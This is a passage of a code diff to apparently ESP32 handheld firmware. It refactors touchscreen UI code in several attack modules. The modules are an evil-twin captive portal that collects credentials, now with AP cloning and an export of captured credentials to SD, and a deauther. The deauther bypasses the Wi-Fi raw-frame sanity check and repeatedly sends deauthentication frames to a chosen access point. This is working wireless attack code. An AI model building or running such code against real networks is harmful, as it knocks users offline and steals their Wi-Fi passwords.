+tft.setTextSize(1);
+tft.setTextDatum(MC_DATUM);
 
 tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
-tft.drawRoundRect(5, buttonY, 50, 20, 8, ORANGE); 
+tft.drawRoundRect(5, buttonY, 50, 20, 8, ORANGE);
 tft.drawString("Back", 30, buttonY + 10);
 
 tft.fillRoundRect(65, buttonY, 50, 20, 8, DARK_GRAY);
@@ -2136,7 +2971,7 @@ tft.drawString("Clear", 90, buttonY + 10);
 
 tft.fillRoundRect(125, buttonY, 50, 20, 8, DARK_GRAY);
 tft.drawRoundRect(125, buttonY, 50, 20, 8, ORANGE);
-tft.drawString("Refr", 150, buttonY + 10);
+tft.drawString("Export", 150, buttonY + 10);
 
 if (credPage > 0) {
   tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
@@ -2164,6 +2999,8 @@ void stopAttack() {
     Serial.println("Web server stopped");
     displayPrint("Web server stopped", GREEN, false);
 
+    cpStopDeauth();
+
     attackActive = false;
     drawMainMenu();
   } else {
@@ -2175,7 +3012,7 @@ void stopAttack() {
 void startAttack() {
   if (!attackActive) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP(custom_ssid, password);
+    WiFi.softAP(custom_ssid, password, ap_channel);
     Serial.println("Access Point started");
     Serial.print("IP Address: ");
     Serial.println(WiFi.softAPIP());
@@ -2200,68 +3037,14 @@ void startAttack() {
   }
 }
 
-void handleMainMenu(int x, int y) {}
+void handleMainMenu(int x, int y) {
+  (void)x;
+  (void)y;
+}
 
 void handleKeyboard(int x, int y) {
-  int yOffset = 95;
-  for (int row = 0; row < 4; row++) {
-    int xOffset = 1;
-    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
-      if (x >= xOffset && x <= xOffset + keyWidth && y >= yOffset && y <= yOffset + keyHeight) {
-        char c = keyboardLayout[row][col];
-        Serial.printf("Key pressed: %c at x=%d, y=%d\n", c, x, y);
-        tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, ORANGE);
-        tft.setTextColor(TFT_WHITE);
-        tft.setTextSize(1);
-        tft.setCursor(xOffset + 6, yOffset + 5);
-        tft.print(c);
-        delay(100);
-        tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
-        tft.setTextColor(TFT_WHITE);
-        tft.setCursor(xOffset + 6, yOffset + 5);
-        tft.print(c);
-        if (c == '<') {
-          if (inputSSID.length() > 0) {
-            inputSSID = inputSSID.substring(0, inputSSID.length() - 1);
-          }
-        } else if (c == '-') {
-          inputSSID = "";
-        } else if (c != ' ') {
-          inputSSID += c;
-        }
-        drawInputField();
-      }
-      xOffset += keyWidth + keySpacing;
-    }
-    yOffset += keyHeight + keySpacing;
-  }
-
-  if (x >= 5 && x <= 75 && y >= 185 && y <= 210) {
-    Serial.printf("Back button pressed at x=%d, y=%d\n", x, y);
-    currentScreen = MAIN_MENU;
-    keyboardActive = false;
-    inputSSID = "";
-    drawMainMenu();
-  }
-
-  if (x >= 85 && x <= 155 && y >= 185 && y <= 210) {
-    Serial.printf("Series button pressed at x=%d, y=%d\n", x, y);
-    inputSSID = seriesSSIDs[seriesSSIDIndex];
-    seriesSSIDIndex = (seriesSSIDIndex + 1) % numSeriesSSIDs;
-    drawInputField();
-  }
-
-  if (x >= 165 && x <= 235 && y >= 185 && y <= 210) {
-    Serial.printf("OK button pressed at x=%d, y=%d\n", x, y);
-    if (inputSSID.length() > 0) {
-      saveSSID(inputSSID);
-      currentScreen = MAIN_MENU;
-      keyboardActive = false;
-      drawMainMenu();
-    } else {
-      Serial.println("No SSID entered");
-    }
-  }
+  (void)x;
+  (void)y;
 }
 
 void handleCredList(int x, int y) {
@@ -2279,8 +3062,8 @@ void handleCredList(int x, int y) {
     yOffset += 10;
   }
 
-  int buttonY = 290; // Match drawing code
-  
+  int buttonY = 290;
+
   if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
     Serial.println("Back button pressed");
     currentScreen = MAIN_MENU;
@@ -2293,8 +3076,13 @@ void handleCredList(int x, int y) {
     drawCredList();
   }
   if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
-    Serial.println("Refresh button pressed");
-    drawCredList();
+    Serial.println("Export button pressed");
+    int dumped = 0;
+    if (cpDumpAllCredentialsToSD(&dumped)) {
+      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", TFT_GREEN);
+    } else {
+      cpCredListStatus("Export failed: SD not ready", TFT_RED);
+    }
   }
   if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
     Serial.println("Prev button pressed");
@@ -2315,17 +3103,18 @@ void runUI() {
 #define STATUS_BAR_Y_OFFSET 20
 #define STATUS_BAR_HEIGHT 16
 #define ICON_SIZE 16
-#define ICON_NUM 5
+#define ICON_NUM 6
 
-  static int iconX[ICON_NUM] = {130, 160, 190, 220, 10};
+  static int iconX[ICON_NUM] = {90, 130, 170, 210, 50, 10};
   static int iconY = STATUS_BAR_Y_OFFSET;
 
   static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_dialog,  
-    bitmap_icon_list,     
-    bitmap_icon_antenna,             
+    bitmap_icon_dialog,
+    bitmap_icon_list,
+    bitmap_icon_antenna,
     bitmap_icon_power,
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_wifi2,
+    bitmap_icon_go_back
   };
 
   if (!uiDrawn) {
@@ -2340,15 +3129,15 @@ void runUI() {
   }
 
   static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;  
+  static int animationState = 0;
   static int activeIcon = -1;
   static unsigned long lastSpamTime = 0;
 
   switch (animationState) {
-    case 0: 
+    case 0:
       break;
 
-    case 1: 
+    case 1:
       if (millis() - lastAnimationTime >= 150) {
         tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
         animationState = 2;
@@ -2363,18 +3152,36 @@ void runUI() {
       }
       break;
 
-    case 3: 
+    case 3:
       switch (activeIcon) {
-        case 0:
-          currentScreen = KEYBOARD;
-          keyboardActive = true;
-          inputSSID = "";
-          cursorState = false;
-          lastCursorToggle = millis();
-          drawKeyboard();
+        case 0: {
+
+          OnScreenKeyboardConfig cfg;
+          cfg.titleLine1      = "[!] Set the SSID that your AP will use";
+          cfg.titleLine2      = "to host the captive portal.";
+          cfg.rows            = keyboardLayout;
+          cfg.rowCount        = 4;
+          cfg.maxLen          = 31;
+          cfg.shuffleNames    = seriesSSIDs;
+          cfg.shuffleCount    = numSeriesSSIDs;
+          cfg.buttonsY        = 195;
+          cfg.backLabel       = "Back";
+          cfg.middleLabel     = "Shuffle";
+          cfg.okLabel         = "OK";
+          cfg.enableShuffle   = true;
+          cfg.requireNonEmpty = true;
+          cfg.emptyErrorMsg   = "SSID cannot be empty!";
+
+          OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, inputSSID);
+          if (r.accepted && r.text.length() > 0) {
+            inputSSID = r.text;
+            saveSSID(inputSSID);
+          }
+          drawMainMenu();
           animationState = 0;
           activeIcon = -1;
           break;
+        }
         case 1:
           currentScreen = CRED_LIST;
           credPage = 0;
@@ -2393,7 +3200,13 @@ void runUI() {
           activeIcon = -1;
           break;
 
-         case 4: // Back icon action (exit to submenu)
+         case 4:
+           cpCloneExistingAPFlow();
+           animationState = 0;
+           activeIcon = -1;
+          break;
+
+         case 5:
            feature_exit_requested = true;
            animationState = 0;
            activeIcon = -1;
@@ -2405,16 +3218,12 @@ void runUI() {
     case 5: break;
   }
 
-
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;  
+  const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
      if (currentScreen == KEYBOARD) {
       handleKeyboard(x, y);
     } else if (currentScreen == CRED_LIST) {
@@ -2427,10 +3236,16 @@ void runUI() {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              if (i == 5) {
+                feature_exit_requested = true;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
             }
             break;
           }
@@ -2449,7 +3264,7 @@ void cportalSetup() {
   uiDrawn = false;
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   runUI();
 
   EEPROM.begin(EEPROM_SIZE);
@@ -2462,7 +3277,6 @@ void cportalSetup() {
   loadSSID();
 
   startAttack();
-  stopAttack();
 
   drawMainMenu();
   setupTouchscreen();
@@ -2470,14 +3284,25 @@ void cportalSetup() {
 
 void cportalLoop() {
 
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
   updateStatusBar();
   runUI();
-  
+
   if (attackActive) {
     dnsServer.processNextRequest();
     server.handleClient();
+
+    unsigned long now = millis();
+    if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
+      cpSendDeauthFrame();
+      cp_last_deauth_time = now;
+    }
   }
 
   if (currentScreen == KEYBOARD) {
@@ -2489,31 +3314,21 @@ void cportalLoop() {
       }
     }
   }
-} 
-
-
-/*
- * 
- * 
- * Deauther
- * 
- * 
-*/
+}
 
 namespace Deauther {
 
 #define SCREEN_WIDTH  240
 #define SCREEN_HEIGHT 320
 
-// Deauthentication frame template
 uint8_t deauth_frame_default[26] = {
-   /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-   /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-   /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-   /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
-   /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
-   /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
-   /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00,
+    0x01, 0x00
 };
 uint8_t deauth_frame[sizeof(deauth_frame_default)];
 
@@ -2528,15 +3343,13 @@ int network_count = 0;
 wifi_ap_record_t *ap_list = nullptr;
 bool scanning = false;
 uint32_t last_packet_time = 0;
-int current_page = 0; 
-const int networks_per_page = 14; 
+int current_page = 0;
+const int networks_per_page = 14;
 
-// Override Wi-Fi sanity check
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
 }
 
-// Send raw frame
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
     packet_count++;
@@ -2545,17 +3358,16 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
         consecutive_failures = 0;
     } else {
         consecutive_failures++;
-        //Serial.printf("Deauth packet %d failed: %s, free heap: %u\n", packet_count, esp_err_to_name(res), ESP.getFreeHeap());
+
     }
 }
 
-// Send deauthentication frame
 void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
     esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source: AP BSSID
-    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID
-    deauth_frame[26] = 7; // Reason code
+    memcpy(&deauth_frame[10], ap_record->bssid, 6);
+    memcpy(&deauth_frame[16], ap_record->bssid, 6);
+    deauth_frame[26] = 7;
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
@@ -2563,25 +3375,19 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
 int compare_ap(const void *a, const void *b) {
     wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
     wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
-    return ap2->rssi - ap1->rssi; // Descending order
+    return ap2->rssi - ap1->rssi;
 }
 
 void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
-    uint16_t color = disabled ? DARK_GRAY : (highlight ? DARK_GRAY : ORANGE);
-    tft.fillRect(x, y, w, h, color);
-    tft.drawRect(x, y, w, h, WHITE); 
-    tft.setTextColor(WHITE);
-    tft.setTextSize(0); 
 
-    int16_t textWidth = strlen(label) * 6; 
-    int16_t textX = x + (w - textWidth) / 2;
-    int16_t textY = y + (h - 6) / 2; 
-    tft.setCursor(textX, textY);
-    tft.println(label);
+    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                             : FeatureUI::ButtonStyle::Secondary;
+    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
 }
 
 void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
-    tft.fillRect(0, 304, SCREEN_WIDTH, 16, DARK_GRAY);
+
+    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
 
     if (leftButton[0]) {
         drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
@@ -2637,7 +3443,7 @@ void drawScanScreen() {
             tft.setCursor(10, y);
             tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
             tft.println(buf);
-            y += 15; 
+            y += 15;
         }
 
         char page_buf[20];
@@ -2648,7 +3454,7 @@ void drawScanScreen() {
     }
 
     const char* leftButton = attack_running ? "Stop Attack" : "Rescan";
-    bool leftDisabled = false; 
+    bool leftDisabled = false;
     const char* prevButton = "Prev";
     bool prevDisabled = attack_running || current_page == 0;
     const char* nextButton = "Next";
@@ -2658,7 +3464,7 @@ void drawScanScreen() {
 
 bool scanNetworks() {
     scanning = true;
-    current_page = 0; 
+    current_page = 0;
     drawScanScreen();
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
@@ -2771,27 +3577,23 @@ void drawAttackScreen() {
     tft.println(buf);
 
     const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
-    drawTabBar(buttons[0], false, "", true, buttons[1], false); 
+    drawTabBar(buttons[0], false, "", true, buttons[1], false);
 }
 
 void handleTouch() {
-    if (!ts.touched()) return;
-
-    TS_Point p = ts.getPoint();
-    
-    int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-    int y = ::map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);
+    int x, y;
+    if (!readTouchXY(x, y)) return;
 
     bool redraw = false;
     if (selected_ap_index == -1) {
         if (!scanning && y >= 60 && y < 270 && network_count > 0) {
-            int index = (y - 60) / 15 + (current_page * networks_per_page); 
+            int index = (y - 60) / 15 + (current_page * networks_per_page);
             if (index >= 0 && index < network_count) {
                 selected_ap_index = index;
                 selectedAp = ap_list[index];
                 selectedChannel = ap_list[index].primary;
-                drawScanScreen(); 
-                delay(50); 
+                drawScanScreen();
+                delay(50);
                 drawAttackScreen();
             }
         } else if (!scanning && y >= 290 && y <= 320) {
@@ -2810,7 +3612,7 @@ void handleTouch() {
                         drawScanScreen();
                     }
                     redraw = true;
-                } 
+                }
             } else {
                 if (x >= 0 && x <= 57) {
                     drawButton(0, 304, 57, 16, "Rescan", true, false);
@@ -2826,7 +3628,7 @@ void handleTouch() {
                         drawScanScreen();
                         delay(50);
                         redraw = true;
-                    } 
+                    }
                 } else if (x >= 183 && x <= 240) {
                     if ((current_page + 1) * networks_per_page < network_count) {
                         drawButton(178, 304, 57, 16, "Next", true, false);
@@ -2834,7 +3636,7 @@ void handleTouch() {
                         drawScanScreen();
                         delay(50);
                         redraw = true;
-                    } 
+                    }
                 }
             }
         }
@@ -2862,7 +3664,7 @@ void handleTouch() {
     }
 
     if (redraw) {
-        delay(100); 
+        delay(100);
     }
 }
 
@@ -2879,9 +3681,9 @@ void runUI() {
   static int iconX[ICON_NUM] = {220, 10};
   static int iconY = STATUS_BAR_Y_OFFSET;
 
-  static const unsigned char* icons[ICON_NUM] = {             
+  static const unsigned char* icons[ICON_NUM] = {
     bitmap_icon_undo,
-    bitmap_icon_go_back // Added back icon
+    bitmap_icon_go_back
   };
 
   if (!uiDrawn) {
@@ -2896,15 +3698,15 @@ void runUI() {
   }
 
   static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;  
+  static int animationState = 0;
   static int activeIcon = -1;
   static unsigned long lastSpamTime = 0;
 
   switch (animationState) {
-    case 0: 
+    case 0:
       break;
 
-    case 1: 
+    case 1:
       if (millis() - lastAnimationTime >= 150) {
         tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
         animationState = 2;
@@ -2919,7 +3721,7 @@ void runUI() {
       }
       break;
 
-    case 3: 
+    case 3:
       switch (activeIcon) {
         case 0:
           scanNetworks();
@@ -2930,33 +3732,30 @@ void runUI() {
           animationState = 0;
           activeIcon = -1;
           break;
-
-         case 1: // Back icon action (exit to submenu)
-           feature_exit_requested = true;
-           animationState = 0;
-           activeIcon = -1;
-          break;
       }
       break;
   }
 
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;  
+  const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
             }
             break;
           }
@@ -2970,53 +3769,69 @@ void runUI() {
 void deautherSetup() {
 
     tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-    
+
     setupTouchscreen();
     uiDrawn = false;
-  
+
     float currentBatteryVoltage = readBatteryVoltage();
-    drawStatusBar(currentBatteryVoltage, false);
+    drawStatusBar(currentBatteryVoltage, true);
     runUI();
 
     tft.drawLine(0, 19, 240, 19, TFT_WHITE);
-    
+
     tft.setTextColor(GREEN, BLACK);
     tft.setTextSize(1);
     tft.setCursor(10, 50);
     tft.println("Initializing...");
 
-    // Initialize NVS
-    esp_err_t ret = nvs_flash_init();
-    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
-        ESP_ERROR_CHECK(nvs_flash_erase());
-        ret = nvs_flash_init();
+    attack_running     = false;
+    selected_ap_index  = -1;
+    current_page       = 0;
+    scanning           = false;
+
+    int bgCount = WiFi.scanComplete();
+    if (bgCount > 0) {
+
+        if (ap_list) {
+            free(ap_list);
+            ap_list = nullptr;
+        }
+
+        network_count = bgCount;
+        ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
+        if (ap_list) {
+            for (int i = 0; i < network_count; i++) {
+                wifi_ap_record_t ap_record = {0};
+                memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
+                strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+                ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
+                ap_record.rssi    = WiFi.RSSI(i);
+                ap_record.primary = WiFi.channel(i);
+                ap_record.authmode = WiFi.encryptionType(i);
+                ap_list[i] = ap_record;
+            }
+
+            qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
+        } else {
+
+            network_count = 0;
+        }
+    } else {
+
+        scanNetworks();
     }
-    ESP_ERROR_CHECK(ret);
 
-    // Initialize Wi-Fi
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    ESP_ERROR_CHECK(esp_wifi_start());
-    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(82));
-    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
-
-    // Set up AP configuration
-    wifi_config_t ap_config = {0};
-    strncpy((char*)ap_config.ap.ssid, "ESP32DIV", sizeof(ap_config.ap.ssid));
-    ap_config.ap.ssid_len = strlen("ESP32DIV");
-    strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
-    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
-    ap_config.ap.ssid_hidden = 0;
-    ap_config.ap.max_connection = 4;
-    ap_config.ap.beacon_interval = 100;
-    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+    drawScanScreen();
 
     drawScanScreen();
 }
 
 void deautherLoop() {
+
+    if (feature_active && isButtonPressed(BTN_SELECT)) {
+        feature_exit_requested = true;
+        return;
+    }
 
     tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
@@ -3026,13 +3841,12 @@ void deautherLoop() {
 
     tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
-    // Packet transmission
     uint32_t current_time = millis();
     if (attack_running && selected_ap_index != -1) {
         uint32_t heap = ESP.getFreeHeap();
         if (heap < 80000) {
             attack_running = false;
-            last_packet_time = 0; // Reset packet timing
+            last_packet_time = 0;
             drawAttackScreen();
             delay(3000);
             return;
@@ -3040,12 +3854,11 @@ void deautherLoop() {
 
         if (consecutive_failures > 10) {
             resetWifi();
-            last_packet_time = 0; // Reset packet timing
+            last_packet_time = 0;
             delay(3000);
             return;
         }
 
-        // Send packets at 100ms intervals, but check attack_running each time
         if (current_time - last_packet_time >= 100 && attack_running) {
             wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
             last_packet_time = current_time;
@@ -3053,7 +3866,7 @@ void deautherLoop() {
     }
 
     static uint32_t last_channel_check = 0;
-    if (attack_running && current_time - last_channel_check > 15000) { // Every 15s
+    if (attack_running && current_time - last_channel_check > 15000) {
         uint8_t new_channel;
         if (checkApChannel(selectedAp.bssid, &new_channel)) {
             if (new_channel != selectedChannel) {
@@ -3068,32 +3881,22 @@ void deautherLoop() {
                 ap_config.ap.beacon_interval = 100;
                 ap_config.ap.channel = selectedChannel;
                 ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-                //Serial.printf("Channel updated to %d\n", selectedChannel);
+
             }
         }
         last_channel_check = current_time;
     }
 
     static uint32_t last_status_time = 0;
-    if (attack_running && current_time - last_status_time > 2000) { // Every 2s
+    if (attack_running && current_time - last_status_time > 2000) {
         drawAttackScreen();
         last_status_time = current_time;
       }
   }
 }
 
-
-/*
- * 
- * 
- * Firmware Update
- * 
- * 
-*/
-
 namespace FirmwareUpdate {
 
-#define SD_CS_PIN 5
 #define FIRMWARE_FILE "/firmware.bin"
 
 const char* host = "esp32";
@@ -3153,7 +3956,7 @@ void drawButton(int x, int y, int w, int h, const char* label, bool highlight, b
 void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
 void drawMenu();
 bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
-void waitForTouch();
+static void waitForTouchXY(int& x, int& y);
 void performSDUpdate();
 void drawNetworkList(int, int, NetworkInfo*, int);
 bool selectWiFiNetwork();
@@ -3399,7 +4202,6 @@ const char* serverIndex = R"(
 </html>
 )";
 
-
 static bool uiDrawn = false;
 
 void runUI() {
@@ -3413,8 +4215,8 @@ void runUI() {
   static int iconX[ICON_NUM] = {10};
   static int iconY = STATUS_BAR_Y_OFFSET;
 
-  static const unsigned char* icons[ICON_NUM] = {             
-    bitmap_icon_go_back // Added back icon
+  static const unsigned char* icons[ICON_NUM] = {
+    bitmap_icon_go_back
   };
 
   if (!uiDrawn) {
@@ -3429,15 +4231,15 @@ void runUI() {
   }
 
   static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;  
+  static int animationState = 0;
   static int activeIcon = -1;
   static unsigned long lastSpamTime = 0;
 
   switch (animationState) {
-    case 0: 
+    case 0:
       break;
 
-    case 1: 
+    case 1:
       if (millis() - lastAnimationTime >= 150) {
         tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
         animationState = 2;
@@ -3452,9 +4254,9 @@ void runUI() {
       }
       break;
 
-    case 3: 
+    case 3:
       switch (activeIcon) {
-         case 0: // Back icon action (exit to submenu)
+         case 0:
            feature_exit_requested = true;
            animationState = 0;
            activeIcon = -1;
@@ -3464,22 +4266,17 @@ void runUI() {
   }
 
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;  
+  const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              feature_exit_requested = true;
             }
             break;
           }
@@ -3490,23 +4287,16 @@ void runUI() {
   }
 }
 
-
 void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
-  uint16_t color = disabled ? TFT_DARKGREY : (highlight ? TFT_DARKGREY : ORANGE);
-  tft.fillRect(x, y, w, h, color);
-  tft.drawRect(x, y, w, h, TFT_WHITE);
-  tft.setTextColor(TFT_WHITE);
-  tft.setTextSize(0);
 
-  int16_t textWidth = strlen(label) * 6;
-  int16_t textX = x + (w - textWidth) / 2;
-  int16_t textY = y + (h - 6) / 2;
-  tft.setCursor(textX, textY);
-  tft.println(label);
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
 }
 
 void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
-  tft.fillRect(0, TAB_Y, SCREEN_WIDTH, TAB_BUTTON_HEIGHT, TFT_DARKGREY);
+
+  tft.fillRect(0, TAB_Y, SCREEN_WIDTH, TAB_BUTTON_HEIGHT, FEATURE_BG);
 
   if (leftButton[0]) {
     drawButton(TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, leftButton, false, leftDisabled);
@@ -3534,11 +4324,12 @@ bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, in
   return (x > buttonX && x < buttonX + buttonW && y > buttonY && y < buttonY + buttonH);
 }
 
-void waitForTouch() {
-  while (!ts.touched()) {
+static void waitForTouchXY(int& x, int& y) {
+  while (!readTouchXY(x, y)) {
     delay(10);
   }
-  delay(200);
+
+  delay(80);
 }
 
 int yshift = 40;
@@ -3563,12 +4354,10 @@ void performSDUpdate() {
   drawTabBar("Start", false, "", false, "Back", false);
 
   bool waitingForStart = true;
-  
+
   while (waitingForStart) {
-    if (ts.touched()) {
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+    int x, y;
+    if (readTouchXY(x, y)) {
